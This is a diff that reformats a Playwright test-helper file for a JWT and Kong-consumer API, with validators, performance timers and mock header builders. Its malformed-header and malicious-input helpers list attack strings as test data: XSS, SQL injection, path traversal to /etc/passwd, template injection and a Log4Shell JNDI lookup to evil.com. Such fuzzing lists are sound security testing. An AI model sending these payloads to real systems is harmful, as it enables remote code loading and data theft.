@@ -1,17 +1,17 @@
 /* test/playwright/utils/test-helpers.ts */
 
-import { expect } from '@playwright/test';
-import { ANONYMOUS_CONSUMER } from '../../shared/test-consumers';
-import type { APIRequestContext } from '@playwright/test';
+import type { APIRequestContext } from "@playwright/test";
+import { expect } from "@playwright/test";
+import { ANONYMOUS_CONSUMER } from "../../shared/test-consumers";
 
 export class JWTValidator {
   static validateStructure(token: string) {
-    const parts = token.split('.');
+    const parts = token.split(".");
     expect(parts).toHaveLength(3);
     return {
-      header: JSON.parse(Buffer.from(parts[0], 'base64url').toString()),
-      payload: JSON.parse(Buffer.from(parts[1], 'base64url').toString()),
-      signature: parts[2]
+      header: JSON.parse(Buffer.from(parts[0], "base64url").toString()),
+      payload: JSON.parse(Buffer.from(parts[1], "base64url").toString()),
+      signature: parts[2],
     };
   }
 
@@ -35,7 +35,7 @@ export class JWTValidator {
   }
 
   static validateRequiredClaims(payload: any) {
-    const requiredClaims = ['exp', 'iat', 'iss', 'aud', 'sub', 'key'];
+    const requiredClaims = ["exp", "iat", "iss", "aud", "sub", "key"];
     for (const claim of requiredClaims) {
       expect(payload).toHaveProperty(claim);
       expect(payload[claim]).toBeTruthy();
@@ -62,7 +62,7 @@ export class PerformanceHelper {
     endpoint: string,
     headers: Record<string, string> = {},
     count: number = 10
-  ): Promise<{ times: number[], p95: number, p99: number }> {
+  ): Promise<{ times: number[]; p95: number; p99: number }> {
     const times: number[] = [];
 
     for (let i = 0; i < count; i++) {
@@ -74,8 +74,8 @@ export class PerformanceHelper {
 
     return {
       times,
-      p95: this.calculatePercentile(times, 95),
-      p99: this.calculatePercentile(times, 99)
+      p95: PerformanceHelper.calculatePercentile(times, 95),
+      p99: PerformanceHelper.calculatePercentile(times, 99),
     };
   }
 }
@@ -83,28 +83,28 @@ export class PerformanceHelper {
 export class KongMockHelper {
   static getInvalidConsumerHeaders() {
     return {
-      'X-Consumer-Id': 'invalid-consumer-id',
-      'X-Consumer-Username': 'invalid-consumer-username'
+      "X-Consumer-Id": "invalid-consumer-id",
+      "X-Consumer-Username": "invalid-consumer-username",
     };
   }
 
   static getAnonymousConsumerHeaders() {
     return {
-      'X-Consumer-Id': ANONYMOUS_CONSUMER.id,
-      'X-Consumer-Username': ANONYMOUS_CONSUMER.username,
-      'X-Anonymous-Consumer': 'true'
+      "X-Consumer-Id": ANONYMOUS_CONSUMER.id,
+      "X-Consumer-Username": ANONYMOUS_CONSUMER.username,
+      "X-Anonymous-Consumer": "true",
     };
   }
 
   static getMalformedHeaders() {
     const malformedVariants = [
-      { 'X-Consumer-Id': '', 'X-Consumer-Username': 'test' },
-      { 'X-Consumer-Id': 'test', 'X-Consumer-Username': '' },
-      { 'X-Consumer-Id': null as any, 'X-Consumer-Username': 'test' },
-      { 'X-Consumer-Id': 'test', 'X-Consumer-Username': undefined as any },
-      { 'X-Consumer-Id': '<script>alert("xss")</script>', 'X-Consumer-Username': 'test' },
-      { 'X-Consumer-Id': '../../../etc/passwd', 'X-Consumer-Username': 'test' },
-      { 'X-Consumer-Id': 'test; DROP TABLE consumers;--', 'X-Consumer-Username': 'test' }
+      { "X-Consumer-Id": "", "X-Consumer-Username": "test" },
+      { "X-Consumer-Id": "test", "X-Consumer-Username": "" },
+      { "X-Consumer-Id": null as any, "X-Consumer-Username": "test" },
+      { "X-Consumer-Id": "test", "X-Consumer-Username": undefined as any },
+      { "X-Consumer-Id": '<script>alert("xss")</script>', "X-Consumer-Username": "test" },
+      { "X-Consumer-Id": "../../../etc/passwd", "X-Consumer-Username": "test" },
+      { "X-Consumer-Id": "test; DROP TABLE consumers;--", "X-Consumer-Username": "test" },
     ];
 
     return malformedVariants[Math.floor(Math.random() * malformedVariants.length)];
@@ -112,19 +112,18 @@ export class KongMockHelper {
 }
 
 export class TestDataGenerator {
-
   static generateMaliciousInput() {
     const payloads = [
       '<script>alert("XSS")</script>',
       '"><script>alert("XSS")</script>',
       "'; DROP TABLE consumers;--",
-      '../../../etc/passwd',
-      '${jndi:ldap://evil.com/a}',
-      '%00',
-      '\x00',
-      '{{7*7}}',
-      '${7*7}',
-      '<img src=x onerror=alert("XSS")>'
+      "../../../etc/passwd",
+      "${jndi:ldap://evil.com/a}",
+      "%00",
+      "\x00",
+      "{{7*7}}",
+      "${7*7}",
+      '<img src=x onerror=alert("XSS")>',
     ];
 
     return payloads[Math.floor(Math.random() * payloads.length)];
@@ -134,38 +133,38 @@ export class TestDataGenerator {
 export class ResponseValidator {
   static validateErrorResponse(response: any, expectedStatus: number, expectedError: string) {
     expect(response.status()).toBe(expectedStatus);
-    expect(response).toHaveProperty('error', expectedError);
-    expect(response).toHaveProperty('message');
-    expect(response).toHaveProperty('timestamp');
-    expect(response).toHaveProperty('path');
+    expect(response).toHaveProperty("error", expectedError);
+    expect(response).toHaveProperty("message");
+    expect(response).toHaveProperty("timestamp");
+    expect(response).toHaveProperty("path");
   }
 
   static validateHealthResponse(data: any) {
-    expect(data).toHaveProperty('status');
-    expect(data).toHaveProperty('version');
-    expect(data).toHaveProperty('timestamp');
-    expect(data).toHaveProperty('uptime');
-    expect(data).toHaveProperty('dependencies');
-    expect(data.dependencies).toHaveProperty('kong');
+    expect(data).toHaveProperty("status");
+    expect(data).toHaveProperty("version");
+    expect(data).toHaveProperty("timestamp");
+    expect(data).toHaveProperty("uptime");
+    expect(data).toHaveProperty("dependencies");
+    expect(data.dependencies).toHaveProperty("kong");
   }
 
   static validateMetricsResponse(data: any) {
-    expect(data).toHaveProperty('timestamp');
-    expect(data).toHaveProperty('uptime');
-    expect(data).toHaveProperty('memory');
-    expect(data.memory).toHaveProperty('used');
-    expect(data.memory).toHaveProperty('total');
-    expect(data.memory).toHaveProperty('rss');
-    expect(data).toHaveProperty('cache');
-    expect(data).toHaveProperty('telemetry');
+    expect(data).toHaveProperty("timestamp");
+    expect(data).toHaveProperty("uptime");
+    expect(data).toHaveProperty("memory");
+    expect(data.memory).toHaveProperty("used");
+    expect(data.memory).toHaveProperty("total");
+    expect(data.memory).toHaveProperty("rss");
+    expect(data).toHaveProperty("cache");
+    expect(data).toHaveProperty("telemetry");
   }
 
   static validateTokenResponse(data: any) {
-    expect(data).toHaveProperty('access_token');
-    expect(data).toHaveProperty('expires_in');
+    expect(data).toHaveProperty("access_token");
+    expect(data).toHaveProperty("expires_in");
     expect(data.expires_in).toBe(900); // 15 minutes
-    expect(typeof data.access_token).toBe('string');
-    expect(data.access_token.split('.')).toHaveLength(3);
+    expect(typeof data.access_token).toBe("string");
+    expect(data.access_token.split(".")).toHaveLength(3);
   }
 }
 
@@ -181,7 +180,7 @@ export class WaitHelper {
       if (await condition()) {
         return;
       }
-      await new Promise(resolve => setTimeout(resolve, interval));
+      await new Promise((resolve) => setTimeout(resolve, interval));
     }
 
     throw new Error(`Condition not met within ${timeout}ms`);
@@ -190,10 +189,10 @@ export class WaitHelper {
   static async waitForHealthy(request: APIRequestContext, maxAttempts: number = 10): Promise<void> {
     for (let i = 0; i < maxAttempts; i++) {
       try {
-        const response = await request.get('/health');
+        const response = await request.get("/health");
         if (response.ok()) {
           const data = await response.json();
-          if (data.status === 'healthy') {
+          if (data.status === "healthy") {
             return;
           }
         }
@@ -201,10 +200,10 @@ export class WaitHelper {
         // Ignore errors and retry
       }
 
-      await new Promise(resolve => setTimeout(resolve, 1000));
+      await new Promise((resolve) => setTimeout(resolve, 1000));
     }
 
-    throw new Error('Service did not become healthy in time');
+    throw new Error("Service did not become healthy in time");
   }
 }
 
@@ -214,9 +213,10 @@ export const customMatchers = {
     const pass = uuidRegex.test(received);
     return {
       pass,
-      message: () => pass
-        ? `Expected ${received} not to be a valid UUID`
-        : `Expected ${received} to be a valid UUID`
+      message: () =>
+        pass
+          ? `Expected ${received} not to be a valid UUID`
+          : `Expected ${received} to be a valid UUID`,
     };
   },
 
@@ -224,21 +224,22 @@ export const customMatchers = {
     const pass = received <= sla;
     return {
       pass,
-      message: () => pass
-        ? `Expected ${received}ms not to be within SLA of ${sla}ms`
-        : `Expected ${received}ms to be within SLA of ${sla}ms`
+      message: () =>
+        pass
+          ? `Expected ${received}ms not to be within SLA of ${sla}ms`
+          : `Expected ${received}ms to be within SLA of ${sla}ms`,
     };
   },
 
   toBeValidJWT(received: string) {
-    const parts = received.split('.');
-    const pass = parts.length === 3 &&
-                 parts.every(part => /^[A-Za-z0-9_-]+$/.test(part));
+    const parts = received.split(".");
+    const pass = parts.length === 3 && parts.every((part) => /^[A-Za-z0-9_-]+$/.test(part));
     return {
       pass,
-      message: () => pass
-        ? `Expected ${received} not to be a valid JWT`
-        : `Expected ${received} to be a valid JWT`
+      message: () =>
+        pass
+          ? `Expected ${received} not to be a valid JWT`
+          : `Expected ${received} to be a valid JWT`,
     };
-  }
+  },
 };
